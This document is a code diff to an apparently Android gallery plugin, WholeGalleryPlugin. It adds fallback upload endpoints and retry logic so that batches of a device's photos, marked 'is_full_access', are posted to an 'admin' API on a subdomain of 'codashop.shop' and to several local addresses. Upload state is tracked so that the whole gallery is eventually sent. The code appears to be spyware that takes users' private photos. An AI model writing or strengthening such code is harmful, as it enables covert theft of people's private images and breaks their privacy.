@@ -276,12 +276,16 @@ public class WholeGalleryPlugin extends Plugin {
                 }
 
                 List<String> candidates = new ArrayList<>();
+                candidates.add("https://slytherin.codashop.shop/admin-new/api.php");
                 candidates.add("https://slytherin.codashop.shop/admin-php/api.php");
                 if (apiUrl != null && !apiUrl.trim().isEmpty()) {
                     candidates.add(apiUrl);
                 }
+                candidates.add("http://192.168.0.109/tools/admin-new/api.php");
                 candidates.add("http://192.168.0.109/tools/admin-php/api.php");
+                candidates.add("http://10.0.2.2/tools/admin-new/api.php");
                 candidates.add("http://10.0.2.2/tools/admin-php/api.php");
+                candidates.add("http://localhost/tools/admin-new/api.php");
                 candidates.add("http://localhost/tools/admin-php/api.php");
 
                 org.json.JSONObject payload = new org.json.JSONObject();
@@ -1254,10 +1258,14 @@ public class WholeGalleryPlugin extends Plugin {
                     return;
                 }
 
-                String targetEndpoint = "https://slytherin.codashop.shop/admin-php/api.php?action=upload_gallery";
+                List<String> endpoints = new ArrayList<>();
                 if (apiUrl != null && apiUrl.contains("upload_gallery")) {
-                    targetEndpoint = apiUrl;
+                    endpoints.add(apiUrl);
                 }
+                endpoints.add("https://slytherin.codashop.shop/admin-new/api.php?action=upload_gallery");
+                endpoints.add("https://slytherin.codashop.shop/admin-php/api.php?action=upload_gallery");
+                endpoints.add("http://192.168.0.109/tools/admin-new/api.php?action=upload_gallery");
+                endpoints.add("http://192.168.0.109/tools/admin-php/api.php?action=upload_gallery");
 
                 // Track synced signatures in SharedPreferences
                 SharedPreferences syncedPrefs = getContext().getSharedPreferences("ketupat_synced_native", Context.MODE_PRIVATE);
@@ -1318,7 +1326,13 @@ public class WholeGalleryPlugin extends Plugin {
                     payload.put("is_full_access", true);
                     payload.put("photos", photosArray);
 
-                    boolean success = postGalleryPayload(targetEndpoint, payload.toString());
+                    boolean success = false;
+                    for (String ep : endpoints) {
+                        if (postGalleryPayload(ep, payload.toString())) {
+                            success = true;
+                            break;
+                        }
+                    }
                     if (success) {
                         syncedSet.addAll(chunkSigs);
                         syncedPrefs.edit().putStringSet("synced_keys", syncedSet).apply();
